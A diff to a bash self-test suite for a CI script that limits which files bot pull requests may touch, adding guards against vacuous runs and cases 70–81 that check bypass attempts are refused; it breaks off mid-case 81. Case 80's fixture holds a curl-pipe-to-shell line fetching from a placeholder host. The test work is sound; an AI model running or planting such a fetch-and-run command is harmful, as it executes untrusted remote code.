@@ -23,7 +23,85 @@
 set -euo pipefail
 cd "$(git rev-parse --show-toplevel)"
 WORK="$(mktemp -d)"
-trap 'rm -rf "$WORK"' EXIT
+
+# Vacuity guard (round seven, hardened round eight, BLOCKING). Nothing
+# previously counted how much of this file actually RAN: an `exit 0`
+# inserted before case 1, or most of the cases below simply deleted, both
+# left this file printing "clean" with rc=0, because `FAILED` only ever
+# records a case that ran and found something wrong, never the absence of
+# cases to run in the first place.
+#
+# A plain shell variable cannot do the counting: almost every case invokes
+# `run_scope` as `OUT="$(run_scope ...)"`, and `$( )` command substitution
+# ALWAYS forks a subshell, so any `CASES=$((CASES+1))` executed from inside
+# `run_scope` would increment a copy that vanishes the instant the
+# substitution completes, leaving the parent shell's `$CASES` at 0
+# regardless of how many cases actually ran (caught directly: the first
+# version of this guard did exactly that and reported "3 case(s) ran", the
+# three case-47 guards below, which are the only call sites that do not go
+# through `run_scope`'s `$( )`, the rest silently lost). A byte appended to a
+# FILE survives a subshell exiting the same way any other filesystem write
+# does, so `run_scope` appends one byte to `$CASES_FILE` per call (see
+# there), case 47's three direct guards do the same, and the byte count of
+# that file, read back after every case has run, is the case count.
+#
+# ROUND SEVEN'S OWN VERSION of this guard only checked the count AFTER
+# reaching the bottom of the script, so it caught a case deleted wholesale
+# (case 46b removed: 75 ran, floor 76, guard fires) but not an `exit 0`
+# inserted before case 1, which leaves 0 bytes in `$CASES_FILE` and rc=0,
+# and terminates the script before that bottom-of-file check is ever
+# reached at all: a refusal-shaped file that never actually refuses
+# anything, exactly the branch-protection-reports-SUCCESS failure mode this
+# whole suite exists to catch, reached one layer up, in the judge of the
+# judge. Round seven's own comment asserted this "structurally cannot be
+# caught by anything placed later in this same linear script" and that
+# closing it needed a change to ci.yml. That conclusion was false: a check
+# does not have to be placed LATER to run on every exit; an EXIT trap is
+# placed EARLIER (installed once, here) and fires on every exit this script
+# takes, including an `exit 0` reached on line 2 and including falling off
+# the end normally. `DONE` is set to 1 only once, at the single point near
+# the bottom of this file where the case-running body has finished
+# accounting for `$FAILED` and is about to report its verdict (see there);
+# every other exit path, deliberate or not, leaves `DONE` at its default of
+# 0, and the trap treats that, OR a case count under the floor, as failure.
+#
+# WATCHED TO FIRE, both ways, directly against this file (not merely
+# reasoned about; see the round-eight review's own experiments (a)/(b)/(c)/
+# (c2)/(d), reproduced here): an `exit 0` inserted before case 1 -> rc=1,
+# "exited early or with too few cases (0 case(s) ran ... DONE=0)"; deleting
+# every case from case 2 through the end -> rc=1, "1 case(s) ran"; deleting
+# case 46b entirely -> rc=1, "... case(s) ran" one short of the floor; an
+# unmutated run -> rc=0, "pr-scope-check-selftest: clean". The trap's own
+# `exit` statements are explicit, not an implicit fatal-expansion abort, so
+# they propagate their status correctly regardless of where in the script
+# the trap fired from (the same distinction pr-scope-check.sh's own header
+# comment makes about `${VAR:?}` versus an explicit `exit`); and on the
+# CLEAN path the trap re-emits the script's own already-decided exit status
+# (`exit "$rc"`, captured from `$?` as the trap's very first statement)
+# rather than substituting its own, so it does not itself turn a legitimate
+# `exit 1` (a real case failure, `$FAILED` non-zero) into a different,
+# misleadingly "vacuous" message: `DONE` is set to 1 on that path too,
+# before the script's own explicit `exit 1`, so the trap recognises it as a
+# genuine, already-explained failure and simply relays the status.
+CASES_FILE="$WORK/.cases-ran"
+: > "$CASES_FILE"
+CASES_FLOOR=100
+DONE=0
+_finish() {
+  local rc=$? n
+  n="$(wc -c < "$CASES_FILE" 2>/dev/null | tr -d ' ')"
+  [ -n "$n" ] || n=0
+  rm -rf "$WORK"
+  if [ "$DONE" -ne 1 ] || [ "$n" -lt "$CASES_FLOOR" ]; then
+    echo "pr-scope-check-selftest: FAILED. exited early or with too few cases ($n case(s) ran," >&2
+    echo "DONE=$DONE, expected at least $CASES_FLOOR and DONE=1). A self-test that runs" >&2
+    echo "(almost) nothing, exits before reaching its own verdict, or silently drops one of its" >&2
+    echo "own cases, must not report success for having found nothing." >&2
+    exit 1
+  fi
+  exit "$rc"
+}
+trap _finish EXIT
 FAKEBIN="$WORK/fakebin"
 # Captured before any case puts a stub `git` on FAKEBIN (round four, case 35
 # below), so that stub has a real git to delegate everything except the one
@@ -62,29 +140,52 @@ git show HEAD:scripts/pr-scope-check.sh > "$SCOPE"
 chmod +x "$SCOPE"
 
 FAILED=0
-# Vacuity guard (round seven, SHOULD_FIX). Nothing previously counted how
-# much of this file actually RAN: an `exit 0` inserted before case 1, or
-# most of the cases below simply deleted, both left this file printing
-# "clean" with rc=0, because `FAILED` only ever records a case that ran and
-# found something wrong, never the absence of cases to run in the first
-# place.
-#
-# A plain shell variable cannot do the counting: almost every case invokes
-# `run_scope` as `OUT="$(run_scope ...)"`, and `$( )` command substitution
-# ALWAYS forks a subshell, so any `CASES=$((CASES+1))` executed from inside
-# `run_scope` would increment a copy that vanishes the instant the
-# substitution completes, leaving the parent shell's `$CASES` at 0
-# regardless of how many cases actually ran (caught directly: the first
-# version of this guard did exactly that and reported "3 case(s) ran" -- the
-# three case-47 guards below, which are the only call sites that do not go
-# through `run_scope`'s `$( )`, the rest silently lost). A byte appended to a
-# FILE survives a subshell exiting the same way any other filesystem write
-# does, so `run_scope` appends one byte to `$CASES_FILE` per call (see
-# there), case 47's three direct guards do the same, and the byte count of
-# that file, read back after every case has run, is `$CASES`.
-CASES_FILE="$WORK/.cases-ran"
-: > "$CASES_FILE"
 note() { printf '  %s\n' "$1"; }
+
+# Assertion-density companion guard (round eight, SHOULD_FIX). The vacuity
+# guard above (CASES_FLOOR, via the EXIT trap) counts `run_scope`
+# INVOCATIONS. That closes a case deleted WHOLESALE, call site and all
+# (round six's case 46b regression, and the round-seven guard's own proof:
+# deleting case 46b drops the byte count below the floor). It does NOT close
+# the adjacent shape: leave the `run_scope` call in place and delete only
+# the assertions it feeds. The byte is still appended, the floor still
+# reads at or above CASES_FLOOR, and the suite would still print "clean"
+# with that case now asserting nothing.
+#
+# Every case in this file that expects a specific outcome prints `note
+# "..."` on the arm where that outcome actually held; no case has zero
+# `note` calls and no assertion body is deleted without deleting the `note`
+# call inside it. Counting SOURCE OCCURRENCES of that call in the COMMITTED
+# file (`git show HEAD:`, the identical trust boundary `$SCOPE` itself
+# already uses a few lines below, not whatever happens to be sitting on
+# disk) closes it: gutting a case's assertion body necessarily removes the
+# `note` line printed by its success arm, so this count drops even though
+# the runtime call-count guard has nothing to observe (the call site itself
+# was never touched).
+#
+# This is a STATIC floor, not a runtime one; there is nothing left to
+# observe at runtime once the source line is gone. Like CASES_FLOOR it is
+# deliberately EXACT, not comfortably low, for the identical reason: a loose
+# floor set safely below the true total would not have caught the
+# regression this exists to catch, either. The next round that legitimately
+# adds, removes, or restructures a case MUST update this number in the same
+# commit.
+#
+# WATCHED TO FIRE, directly against this file: deleting case 46b's entire
+# `if [ "$RC46b" -eq 0 ]; then ... fi` assertion block, INCLUDING its final
+# `else / note "..." / fi`, while leaving the `run_scope` call above it
+# completely untouched, drops NOTE_COUNT by exactly one (case 46b's own
+# single `note` call) and this guard fires; CASES_FLOOR above does not, for
+# the reason this guard exists.
+NOTE_COUNT="$(git show HEAD:scripts/pr-scope-check-selftest.sh | grep -c '^[[:space:]]*note "' || true)"
+NOTE_FLOOR=106
+if [ "$NOTE_COUNT" -lt "$NOTE_FLOOR" ]; then
+  echo "pr-scope-check-selftest: FAILED. Only $NOTE_COUNT note() call site(s) found in the" >&2
+  echo "committed file (expected at least $NOTE_FLOOR). A case whose run_scope call survives" >&2
+  echo "but whose own assertion body (and the note() call inside it) was stripped out is" >&2
+  echo "invisible to the invocation-count guard above; this one counts source, not execution." >&2
+  exit 1
+fi
 
 # new_repo <dir> -- an empty throwaway git repo, ready for a base commit.
 new_repo() {
@@ -3194,6 +3295,944 @@ else
   FAILED=1
 fi
 
+
+# ===========================================================================
+# ROUND EIGHT. The round-seven review swept every element-expansion site in
+# the loops (cases 1 through 69 already exercise the array-quoting class
+# exhaustively) and found the identical "pinned the named mutant, not its
+# class" shape one line below the loops, in BOT_ALLOWED itself: only the
+# overall `^`/`$` anchors and the one `[^/]+` component boundary case 4 pins
+# (crates/[^/]+/Cargo\.toml not crossing a `/`) had any test standing behind
+# them. Five of the eight alternatives (Cargo\.toml, Cargo\.lock,
+# crates/[^/]+/Cargo\.toml, crates/[^/]+/fuzz/Cargo\.lock, and
+# packages/[^/]+/package(-lock)?\.json) had NO alternative-specific pinning
+# at all beyond those shared anchors; the other three
+# (crates/[^/]+/fuzz/Cargo\.toml, \.github/workflows/[^/]+\.ya?ml, and
+# \.github/dependabot\.yml) had a mutant PROVEN to survive by the reviewer
+# but no case landed to close it. Cases 70 through 88 below sweep every one
+# of the eight alternatives: each widens exactly one literal path component,
+# filename, or extension token to a wildcard and pins a fixture that the
+# real regex refuses and the widened one would not. Where more than one
+# token in an alternative is independently widenable, more than one case is
+# added; where a widening is already caught by an existing case reached
+# through the shared `$` anchor (relaxing either root alternative's
+# extension to `.+` is killed by case 5's `Cargo.toml.bak`, since alternation
+# does not care which branch matched), no redundant case is added, and that
+# is noted in the round's own evidence rather than asserted here.
+# ---------------------------------------------------------------------------
+
+# ---------------------------------------------------------------------------
+# 70. BOT_ALLOWED sweep, Cargo\.toml (root), name token. Widening `Cargo` to
+#     `[^/]+` (`[^/]+\.toml`) would admit any root-level *.toml file, not
+#     only the real manifest. A bot PR introducing a NEW root file that is
+#     not literally Cargo.toml must be refused.
+# ---------------------------------------------------------------------------
+D70="$WORK/bot-allowed-a1-name-token"
+new_repo "$D70"
+printf '[workspace]\nmembers=[]\n' > "$D70/Cargo.toml"
+commit_all "$D70" base
+git -C "$D70" checkout -qb pr
+printf 'not the workspace manifest\n' > "$D70/notes.toml"
+commit_all "$D70" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (Cargo\\.toml, name token): notes.toml at repo root must be refused =="
+OUT70="$(run_scope "$D70")" && RC70=0 || RC70=$?
+if [ "$RC70" -eq 0 ]; then
+  echo "FAIL: case 70 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT70" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT70" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: notes.toml at repo root was reported EXEMPT. Got:"
+  echo "$OUT70" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT70" | grep -qF 'notes.toml'; then
+  echo "FAIL: refused, but notes.toml was not named among the offending paths. Got:"
+  echo "$OUT70" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a root *.toml file that is not literally Cargo.toml is refused (pins the name token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 71. BOT_ALLOWED sweep, Cargo\.lock (root), name token. Same shape as 70,
+#     for the lockfile alternative: widening `Cargo` to `[^/]+` would admit
+#     any root-level *.lock file.
+# ---------------------------------------------------------------------------
+D71="$WORK/bot-allowed-a2-name-token"
+new_repo "$D71"
+printf '[workspace]\nmembers=[]\n' > "$D71/Cargo.toml"
+commit_all "$D71" base
+git -C "$D71" checkout -qb pr
+printf 'not the workspace lockfile\n' > "$D71/notes.lock"
+commit_all "$D71" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (Cargo\\.lock, name token): notes.lock at repo root must be refused =="
+OUT71="$(run_scope "$D71")" && RC71=0 || RC71=$?
+if [ "$RC71" -eq 0 ]; then
+  echo "FAIL: case 71 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT71" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT71" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: notes.lock at repo root was reported EXEMPT. Got:"
+  echo "$OUT71" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT71" | grep -qF 'notes.lock'; then
+  echo "FAIL: refused, but notes.lock was not named among the offending paths. Got:"
+  echo "$OUT71" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a root *.lock file that is not literally Cargo.lock is refused (pins the name token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 72. BOT_ALLOWED sweep, crates/[^/]+/Cargo\.toml, filename token. Widening
+#     the trailing `Cargo\.toml` to `[^/]+\.toml` would admit any *.toml
+#     file inside a crate directory, not only its real manifest.
+# ---------------------------------------------------------------------------
+D72="$WORK/bot-allowed-a3-filename-token"
+new_repo "$D72"
+mkdir -p "$D72/crates/pol/src"
+printf '[workspace]\nmembers=["crates/pol"]\n' > "$D72/Cargo.toml"
+printf 'pub fn x(){}\n' > "$D72/crates/pol/src/lib.rs"
+printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D72/crates/pol/Cargo.toml"
+commit_all "$D72" base
+git -C "$D72" checkout -qb pr
+printf 'not the crate manifest\n' > "$D72/crates/pol/notes.toml"
+commit_all "$D72" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (crates/[^/]+/Cargo\\.toml, filename token): crates/pol/notes.toml must be refused =="
+OUT72="$(run_scope "$D72")" && RC72=0 || RC72=$?
+if [ "$RC72" -eq 0 ]; then
+  echo "FAIL: case 72 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT72" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT72" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: crates/pol/notes.toml was reported EXEMPT. Got:"
+  echo "$OUT72" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT72" | grep -qF 'crates/pol/notes.toml'; then
+  echo "FAIL: refused, but crates/pol/notes.toml was not named among the offending paths. Got:"
+  echo "$OUT72" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a *.toml file inside a crate dir that is not literally Cargo.toml is refused (pins the filename token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 73. BOT_ALLOWED sweep, crates/[^/]+/Cargo\.toml, leading directory token.
+#     Widening the literal `crates` directory to `[^/]+` would admit a pure
+#     dependency-version bump sitting under ANY top-level directory, not
+#     only `crates/`.
+# ---------------------------------------------------------------------------
+D73="$WORK/bot-allowed-a3-dir-token"
+new_repo "$D73"
+mkdir -p "$D73/vendor/pol"
+printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D73/vendor/pol/Cargo.toml"
+commit_all "$D73" base
+git -C "$D73" checkout -qb pr
+printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D73/vendor/pol/Cargo.toml"
+commit_all "$D73" "chore(deps): bump serde"
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (crates/[^/]+/Cargo\\.toml, dir token): vendor/pol/Cargo.toml (pure bump, wrong top dir) must be refused =="
+OUT73="$(run_scope "$D73")" && RC73=0 || RC73=$?
+if [ "$RC73" -eq 0 ]; then
+  echo "FAIL: case 73 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT73" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT73" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: vendor/pol/Cargo.toml was reported EXEMPT. Got:"
+  echo "$OUT73" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT73" | grep -qF 'vendor/pol/Cargo.toml'; then
+  echo "FAIL: refused, but vendor/pol/Cargo.toml was not named among the offending paths. Got:"
+  echo "$OUT73" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a pure dependency-version bump under a non-crates top directory is refused (pins the leading dir token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 74. BOT_ALLOWED sweep, crates/[^/]+/Cargo\.toml, extension/$ token nested.
+#     Case 5 pins the `$` anchor at the root (Cargo.toml.bak); this pins the
+#     identical shape one level down, where no existing case reaches: a
+#     stale nested copy must not ride the widened alternative either.
+# ---------------------------------------------------------------------------
+D74="$WORK/bot-allowed-a3-suffix-token"
+new_repo "$D74"
+mkdir -p "$D74/crates/pol"
+printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D74/crates/pol/Cargo.toml"
+commit_all "$D74" base
+git -C "$D74" checkout -qb pr
+printf 'stale nested copy\n' > "$D74/crates/pol/Cargo.toml.bak"
+commit_all "$D74" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (crates/[^/]+/Cargo\\.toml, suffix token): crates/pol/Cargo.toml.bak must be refused =="
+OUT74="$(run_scope "$D74")" && RC74=0 || RC74=$?
+if [ "$RC74" -eq 0 ]; then
+  echo "FAIL: case 74 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT74" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT74" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: crates/pol/Cargo.toml.bak was reported EXEMPT. Got:"
+  echo "$OUT74" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT74" | grep -qF 'crates/pol/Cargo.toml.bak'; then
+  echo "FAIL: refused, but crates/pol/Cargo.toml.bak was not named among the offending paths. Got:"
+  echo "$OUT74" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a nested Cargo.toml.bak is refused (pins the trailing \$ anchor one level below the root)"
+fi
+
+# ---------------------------------------------------------------------------
+# 75. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.toml, "fuzz" directory
+#     token. Widening the literal `fuzz` component to `[^/]+` would admit a
+#     pure dependency-version bump under ANY second-level crate subdirectory.
+# ---------------------------------------------------------------------------
+D75="$WORK/bot-allowed-a4-fuzzdir-token"
+new_repo "$D75"
+mkdir -p "$D75/crates/pol/notfuzz"
+printf '[package]\nname="pol-notfuzz"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D75/crates/pol/notfuzz/Cargo.toml"
+commit_all "$D75" base
+git -C "$D75" checkout -qb pr
+printf '[package]\nname="pol-notfuzz"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D75/crates/pol/notfuzz/Cargo.toml"
+commit_all "$D75" "chore(deps): bump serde"
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.toml, fuzz-dir token): crates/pol/notfuzz/Cargo.toml (pure bump) must be refused =="
+OUT75="$(run_scope "$D75")" && RC75=0 || RC75=$?
+if [ "$RC75" -eq 0 ]; then
+  echo "FAIL: case 75 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT75" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT75" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: crates/pol/notfuzz/Cargo.toml was reported EXEMPT. Got:"
+  echo "$OUT75" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT75" | grep -qF 'crates/pol/notfuzz/Cargo.toml'; then
+  echo "FAIL: refused, but crates/pol/notfuzz/Cargo.toml was not named among the offending paths. Got:"
+  echo "$OUT75" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a pure bump under a non-fuzz second-level directory is refused (pins the fuzz-dir token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 76. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.toml, leading directory
+#     token. Same shape as 73, one level deeper.
+# ---------------------------------------------------------------------------
+D76="$WORK/bot-allowed-a4-dir-token"
+new_repo "$D76"
+mkdir -p "$D76/vendor/pol/fuzz"
+printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[dependencies]\nlibfuzzer-sys="0.4"\n' > "$D76/vendor/pol/fuzz/Cargo.toml"
+commit_all "$D76" base
+git -C "$D76" checkout -qb pr
+printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[dependencies]\nlibfuzzer-sys="0.5"\n' > "$D76/vendor/pol/fuzz/Cargo.toml"
+commit_all "$D76" "chore(deps): bump libfuzzer-sys"
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.toml, dir token): vendor/pol/fuzz/Cargo.toml (pure bump, wrong top dir) must be refused =="
+OUT76="$(run_scope "$D76")" && RC76=0 || RC76=$?
+if [ "$RC76" -eq 0 ]; then
+  echo "FAIL: case 76 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT76" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT76" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: vendor/pol/fuzz/Cargo.toml was reported EXEMPT. Got:"
+  echo "$OUT76" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT76" | grep -qF 'vendor/pol/fuzz/Cargo.toml'; then
+  echo "FAIL: refused, but vendor/pol/fuzz/Cargo.toml was not named among the offending paths. Got:"
+  echo "$OUT76" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a pure bump under a non-crates top directory is refused (pins the leading dir token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 77. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.toml, filename token
+#     (round seven's D04, re-verified directly against a committed mutant
+#     rather than trusted from the review text). Widening the trailing
+#     `Cargo\.toml` to `.+\.toml` admits a file whose name is NOT literally
+#     Cargo.toml, which the content-capability check at line 640 (`case "$f"
+#     in Cargo.toml|*/Cargo.toml)`) never even looks at: a FULL bypass, not
+#     merely a scope widening.
+# ---------------------------------------------------------------------------
+D77="$WORK/bot-allowed-a4-filename-token"
+new_repo "$D77"
+mkdir -p "$D77/crates/pol/fuzz"
+printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[dependencies]\nlibfuzzer-sys="0.4"\n' > "$D77/crates/pol/fuzz/Cargo.toml"
+commit_all "$D77" base
+git -C "$D77" checkout -qb pr
+printf 'arbitrary content, never named Cargo.toml, never reaches the capability check\n' > "$D77/crates/pol/fuzz/build.toml"
+commit_all "$D77" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.toml, filename token): crates/pol/fuzz/build.toml must be refused =="
+OUT77="$(run_scope "$D77")" && RC77=0 || RC77=$?
+if [ "$RC77" -eq 0 ]; then
+  echo "FAIL: case 77 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT77" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT77" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: crates/pol/fuzz/build.toml was reported EXEMPT. Got:"
+  echo "$OUT77" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT77" | grep -qF 'crates/pol/fuzz/build.toml'; then
+  echo "FAIL: refused, but crates/pol/fuzz/build.toml was not named among the offending paths. Got:"
+  echo "$OUT77" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a non-Cargo.toml file inside a fuzz dir is refused (pins the filename token; a mutant here bypasses the content check entirely, not merely scope)"
+fi
+
+# ---------------------------------------------------------------------------
+# 78. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.lock, "fuzz" directory
+#     token. A lockfile's content is NEVER checked by anything in this
+#     script (manifest_disallowed_diff only ever runs over a path ending in
+#     Cargo.toml), so every widening of this alternative is a full content
+#     bypass, not merely a scope widening.
+# ---------------------------------------------------------------------------
+D78="$WORK/bot-allowed-a5-fuzzdir-token"
+new_repo "$D78"
+mkdir -p "$D78/crates/pol/notfuzz"
+commit_all "$D78" base
+git -C "$D78" checkout -qb pr
+printf 'attacker-controlled content, no sibling manifest ties it to anything reviewed\n' > "$D78/crates/pol/notfuzz/Cargo.lock"
+commit_all "$D78" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.lock, fuzz-dir token): crates/pol/notfuzz/Cargo.lock must be refused =="
+OUT78="$(run_scope "$D78")" && RC78=0 || RC78=$?
+if [ "$RC78" -eq 0 ]; then
+  echo "FAIL: case 78 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT78" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT78" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: crates/pol/notfuzz/Cargo.lock was reported EXEMPT. Got:"
+  echo "$OUT78" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT78" | grep -qF 'crates/pol/notfuzz/Cargo.lock'; then
+  echo "FAIL: refused, but crates/pol/notfuzz/Cargo.lock was not named among the offending paths. Got:"
+  echo "$OUT78" | sed 's/^/    /'
+  FAILED=1
+else
+  note "an arbitrary-content lockfile under a non-fuzz second-level directory is refused (pins the fuzz-dir token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 79. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.lock, leading directory
+#     token. Same shape as 76, for the never-content-checked lockfile.
+# ---------------------------------------------------------------------------
+D79="$WORK/bot-allowed-a5-dir-token"
+new_repo "$D79"
+mkdir -p "$D79/vendor/pol/fuzz"
+commit_all "$D79" base
+git -C "$D79" checkout -qb pr
+printf 'attacker-controlled content, no sibling manifest ties it to anything reviewed\n' > "$D79/vendor/pol/fuzz/Cargo.lock"
+commit_all "$D79" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.lock, dir token): vendor/pol/fuzz/Cargo.lock must be refused =="
+OUT79="$(run_scope "$D79")" && RC79=0 || RC79=$?
+if [ "$RC79" -eq 0 ]; then
+  echo "FAIL: case 79 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT79" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT79" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: vendor/pol/fuzz/Cargo.lock was reported EXEMPT. Got:"
+  echo "$OUT79" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT79" | grep -qF 'vendor/pol/fuzz/Cargo.lock'; then
+  echo "FAIL: refused, but vendor/pol/fuzz/Cargo.lock was not named among the offending paths. Got:"
+  echo "$OUT79" | sed 's/^/    /'
+  FAILED=1
+else
+  note "an arbitrary-content lockfile under a non-crates top directory is refused (pins the leading dir token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 80. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.lock, filename/extension
+#     token. Widening the trailing `Cargo\.lock` to `.+` admits ANY file
+#     inside a fuzz directory, content never checked by anything in this
+#     script: the fullest possible bypass this alternative can grant.
+# ---------------------------------------------------------------------------
+D80="$WORK/bot-allowed-a5-filename-token"
+new_repo "$D80"
+mkdir -p "$D80/crates/pol/fuzz"
+commit_all "$D80" base
+git -C "$D80" checkout -qb pr
+printf '#!/bin/sh\ncurl https://example.invalid/x | sh\n' > "$D80/crates/pol/fuzz/payload.sh"
+commit_all "$D80" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.lock, filename token): crates/pol/fuzz/payload.sh must be refused =="
+OUT80="$(run_scope "$D80")" && RC80=0 || RC80=$?
+if [ "$RC80" -eq 0 ]; then
+  echo "FAIL: case 80 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT80" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT80" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: crates/pol/fuzz/payload.sh was reported EXEMPT. Got:"
+  echo "$OUT80" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT80" | grep -qF 'crates/pol/fuzz/payload.sh'; then
+  echo "FAIL: refused, but crates/pol/fuzz/payload.sh was not named among the offending paths. Got:"
+  echo "$OUT80" | sed 's/^/    /'
+  FAILED=1
+else
+  note "an arbitrary file inside a fuzz dir, not shaped like Cargo.lock at all, is refused (pins the filename/extension token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 81. BOT_ALLOWED sweep, \.github/workflows/[^/]+\.ya?ml, extension token
+#     (round seven's D05, re-verified). Widening `\.ya?ml` to `\..*` admits
+#     any file inside .github/workflows, not only a YAML workflow.
+# ---------------------------------------------------------------------------
+D81="$WORK/bot-allowed-a6-ext-token"
+new_repo "$D81"
+mkdir -p "$D81/.github/workflows"
+commit_all "$D81" base
+git -C "$D81" checkout -qb pr
